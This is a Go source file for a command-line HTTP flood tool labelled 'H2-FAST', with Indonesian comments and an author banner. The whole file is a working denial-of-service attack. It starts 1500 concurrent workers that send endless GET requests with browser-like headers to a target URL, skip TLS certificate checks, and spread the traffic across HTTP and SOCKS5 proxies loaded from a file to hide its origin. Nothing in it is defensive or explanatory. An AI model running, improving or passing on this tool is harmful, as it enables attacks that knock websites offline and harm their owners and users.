package main

// >>>>> Import Library
import (
"bufio"
"context"
"crypto/tls"
"fmt"
"io"
"net"
"net/http"
"net/url"
"os"
"os/signal"
"runtime"
"strconv"
"strings"
"sync"
"syscall"
"time"
// >>>>> SOCKS5
"golang.org/x/net/proxy"
// >>>>> Buat CPU Live
"github.com/shirou/gopsutil/v3/cpu"
)

// >>>>> Warna
const (
Reset = "\033[0m"
Red = "\033[31m"
Green = "\033[32m"
White = "\033[37m"
RedBright = "\033[91m"
RedLight = "\033[38;5;203m"
RedPink = "\033[38;5;204m"
LightPink = "\033[38;5;218m"
WhiteBright = "\033[97m"
)

// >>>>> Config
const (
WRK = 1500
TO = 6 * time.Second
KA = 30 * time.Second
)

// >>>>> Semua Core
func init() {
runtime.GOMAXPROCS(runtime.NumCPU())
}

// >>>>> Ip Proxy
type CLI struct {
CL *http.Client
IP string
}

// >>>>> Fungsi CPU (Simple pake gopsutil)
func getCPU() string {
p, err := cpu.Percent(0, false)
if err == nil && len(p) > 0 {
return fmt.Sprintf("%.1f%%", p[0])
}
return "0.0%"
}

// >>>>> Worker Spam
func SPAM(cli CLI, tgt string, ctx context.Context, wg *sync.WaitGroup, id int) {
defer wg.Done()

for ctx.Err() == nil {
req, _ := http.NewRequest("GET", tgt, nil)

req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
req.Header.Set("Accept-Encoding", "gzip, deflate, br")
req.Header.Set("Connection", "keep-alive")
req.Header.Set("Cache-Control", "no-cache")
req.Header.Set("Pragma", "no-cache")

resp, err := cli.CL.Do(req)
if err == nil {
io.Copy(io.Discard, resp.Body)
resp.Body.Close()}
}
}

// >>>>> Transport
func CHT(p *url.URL) *http.Transport {
tr := &http.Transport{
DialContext: (&net.Dialer{
Timeout: 5 * time.Second,
KeepAlive: KA,
}).DialContext,
DisableKeepAlives: false,
MaxIdleConns: 50000,
MaxIdleConnsPerHost: 50000,
MaxConnsPerHost: 0,
IdleConnTimeout: KA,
DisableCompression: true,
TLSClientConfig: &tls.Config{
InsecureSkipVerify: true,
NextProtos: []string{"h2", "http/1.1"},
MinVersion: tls.VersionTLS12,
MaxVersion: tls.VersionTLS13,
},
ForceAttemptHTTP2: true,
TLSHandshakeTimeout: 4 * time.Second,
ResponseHeaderTimeout: 4 * time.Second,}
if p != nil {
tr.Proxy = http.ProxyURL(p)}
return tr
}

// >>>>> Transport Socks
func CST(a string) (*http.Transport, error) {
d, err := proxy.SOCKS5("tcp", a, nil, proxy.Direct)
if err != nil {
return nil, err
}

tr := &http.Transport{
DialContext: func(ctx context.Context, n, a string) (net.Conn, error) {
return d.Dial(n, a)},
DisableKeepAlives: false,
MaxIdleConns: 0,
MaxIdleConnsPerHost: 0,
MaxConnsPerHost: 0,
IdleConnTimeout: KA,
DisableCompression: true,
TLSClientConfig: &tls.Config{
InsecureSkipVerify: true,
NextProtos: []string{"h2", "http/1.1"},
MinVersion: tls.VersionTLS12,
MaxVersion: tls.VersionTLS13,
},
ForceAttemptHTTP2: true,
TLSHandshakeTimeout: 4 * time.Second,
ResponseHeaderTimeout: 4 * time.Second,}
return tr, nil
}

// >>>>> Parse Http/Socks
func PP(l string) (*url.URL, string, error) {
l = strings.TrimSpace(l)
if l == "" {
return nil, "", nil
}
if strings.HasPrefix(l, "socks5://") {
u, err := url.Parse(l)
if err != nil {
return nil, "", err
}
return u, "socks5", nil
}
if !strings.HasPrefix(l, "http://") && !strings.HasPrefix(l, "https://") {
l = "http://" + l
}
u, err := url.Parse(l)
if err != nil {
return nil, "", err
}
return u, "http", nil
}

// >>>>> All Main
func main() {

if len(os.Args) < 2 {
fmt.Println("Cara pakai: H2-FAST.go <target> <durasi> <proxy>")
fmt.Println("Contoh: H2-FAST.go https://target.com 60 proxy.txt")
os.Exit(1)}

tgt := os.Args[1]
dur := 0
proxyFile := "proxy.txt"

if len(os.Args) >= 3 {
if d, err := strconv.Atoi(os.Args[2]); err == nil && d > 0 {
dur = d
} else {
proxyFile = os.Args[2]}}
if len(os.Args) >= 4 {
if d, err := strconv.Atoi(os.Args[3]); err == nil && d > 0 {
dur = d
} else {
proxyFile = os.Args[3]}}

parsed, _ := url.Parse(tgt)
host := parsed.Hostname()
if strings.HasPrefix(host, "www.") {
host = host[4:]}

var cls []CLI
proxyExists := false
f, err := os.Open(proxyFile)
if err == nil {
proxyExists = true
defer f.Close()
s := bufio.NewScanner(f)
for s.Scan() {
l := s.Text()
if l == "" {
continue
}
pu, pt, err := PP(l)
if err != nil {
continue
}
var tr *http.Transport
var ip string
if pt == "socks5" {
tr, err = CST(pu.Host)
if err != nil {
continue
}
ip = pu.Hostname()
} else {
tr = CHT(pu)
ip = pu.Hostname()}
c := &http.Client{
Transport: tr,
Timeout: TO,
}
cls = append(cls, CLI{CL: c, IP: ip})}}

if len(cls) == 0 {
tr := CHT(nil)
c := &http.Client{
Transport: tr,
Timeout: TO,
}
cls = append(cls, CLI{CL: c, IP: ""})}

fmt.Printf("%s", WhiteBright)
fmt.Println("\n:::::::-.  :::::::::      .,~:::::    .:::.")
fmt.Printf("%s", LightPink)
fmt.Println(" ;;,   `';,'`````;;;    ,;;;'````'   ,;'``;.")
fmt.Printf("%s", RedPink)
fmt.Println(" `[[     [[    .n[['    [[[          ''  ,['")
fmt.Printf("%s", RedLight)
fmt.Println("  $$,    $$  ,$$P\" cccc $$$          .c$$P'")
fmt.Printf("%s", Red)
fmt.Println("  888_,o8P',888bo,_     `88bo,__,o, d88 _,oo,")
fmt.Printf("%s", RedBright)
fmt.Println("  MMMMP\"`   `\"\"*UMM       \"YUMMMMMP\"MMMUP*\"^^")
fmt.Printf("%s", Reset)
fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", Red, Reset)

fmt.Printf("%s〇%s %sAuthor%s %s:%s %sDIZ FLYZE%s\n", Green, Reset, White, Reset, Red, Reset, White, Reset)
fmt.Printf("%s〇%s %sTarget%s %s:%s %s%s%s\n", Green, Reset, White, Reset, Red, Reset, White, host, Reset)
fmt.Printf("%s〇%s %sPort%s   %s:%s %s443%s\n", Green, Reset, White, Reset, Red, Reset, White, Reset)
fmt.Printf("%s〇%s %sMethod%s %s:%s %sH2-FAST%s\n", Green, Reset, White, Reset, Red, Reset, White, Reset)
fmt.Printf("%s〇%s %sWorker%s %s:%s %s%d%s\n", Green, Reset, White, Reset, Red, Reset, White, WRK, Reset)

proxyStatus := "False"
if proxyExists {
proxyStatus = "True"
}
fmt.Printf("%s〇%s %sProxy%s  %s:%s %s%s%s\n", Green, Reset, White, Reset, Red, Reset, White, proxyStatus, Reset)
fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", Red, Reset)

fmt.Print("\033[?25l")
defer fmt.Print("\033[?25h")

ctx, cancel := context.WithCancel(context.Background())
st := time.Now()

if dur > 0 {
go func() {
t := time.NewTicker(1 * time.Second)
defer t.Stop()
for range t.C {
elapsed := int(time.Since(st).Seconds())
if elapsed > dur {
elapsed = dur
}
cpuDisplay := getCPU()
fmt.Printf("\r\033[K%s〇%s %sTimer%s  %s:%s %s%02d/%ds%s\n", Green, Reset, White, Reset, Red, Reset, White, elapsed, dur, Reset)
fmt.Printf("\033[K%s〇%s %sCPU%s    %s:%s %s%s%s", Green, Reset, White, Reset, Red, Reset, White, cpuDisplay, Reset)
fmt.Print("\033[A")
if elapsed >= dur {
cancel()
return
}}}()
time.AfterFunc(time.Duration(dur)*time.Second, cancel)
} else {
go func() {
t := time.NewTicker(1 * time.Second)
defer t.Stop()
for range t.C {
cpuDisplay := getCPU()
fmt.Printf("\r\033[K%s〇%s %sTimer%s  %s:%s %s∞%s\n", Green, Reset, White, Reset, Red, Reset, White, Reset)
fmt.Printf("\033[K%s〇%s %sCPU%s    %s:%s %s%s%s", Green, Reset, White, Reset, Red, Reset, White, cpuDisplay, Reset)
fmt.Print("\033[A")}}()}

var wg sync.WaitGroup
for i := 0; i < WRK; i++ {
wg.Add(1)
cli := cls[i%len(cls)]
go SPAM(cli, tgt, ctx, &wg, i)}

sig := make(chan os.Signal, 1)
signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
select {
case <-sig:
cancel()
case <-ctx.Done():}

wg.Wait()}
